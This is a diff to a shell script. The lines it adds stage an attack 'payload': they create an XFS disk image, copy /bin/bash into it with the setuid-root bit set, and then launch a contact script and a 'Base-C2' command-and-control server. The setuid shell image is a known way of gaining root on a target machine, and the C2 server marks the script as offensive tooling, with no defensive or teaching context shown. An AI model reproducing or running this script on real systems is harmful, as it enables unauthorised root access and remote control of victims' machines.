@@ -15,4 +15,13 @@ else
     exit 1
 fi
 
+echo "creating payload..."
+dd if=/dev/zero of=./xfs.image bs=1M count=300
+mkfs.xfs ./xfs.image
+mkdir ./xfs.mount
+mount -t xfs ./xfs.image ./xfs.mount
+cp /bin/bash ./xfs.mount
+chmod 04555 ./xfs.mount/bash
+umount ./xfs.mount
+
 python3 contact.py $1 && python3 Base-C2/server.py
